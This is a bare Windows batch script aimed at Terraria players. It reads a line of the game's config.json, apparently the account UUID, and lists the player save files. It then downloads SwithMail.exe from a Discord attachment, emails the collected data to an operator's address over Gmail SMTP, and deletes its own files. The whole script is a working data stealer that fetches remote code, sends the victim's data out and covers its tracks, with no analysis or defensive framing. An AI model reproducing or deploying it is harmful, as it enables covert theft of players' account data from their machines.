@echo off
setlocal enabledelayedexpansion
 
set file=%USERPROFILE%\Documents\My Games\Terraria\config.json
set first=27
set second=27
set out=tempfile.txt
 
set counter=0
<nul set /p x=>"%out%"
for /f "usebackq tokens=*" %%A IN ("%file%") DO (
 set /a counter=!counter!+1
 if !counter! GEQ %first% (
  if !counter! LEQ %second% (
   echo.%%A>>"%out%"
  )
 )
)

chcp 1251
dir "%USERPROFILE%\Documents\My Games\Terraria\Players" >> tempfile.txt
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/401711156793966602/406858620110635009/SwithMail.exe', 'SwithMail.exe')"
SwithMail.exe /s /from YOUREMAIL@gmail.com /pass YOURPASSWORD /server smtp.gmail.com /p 587 /SSL /to EMAILRECIPIENT@gmail.com /sub UUID /b UUID /attachment tempfile.txt
del /s /q tempfile.txt
del /s /q SwithMail.exe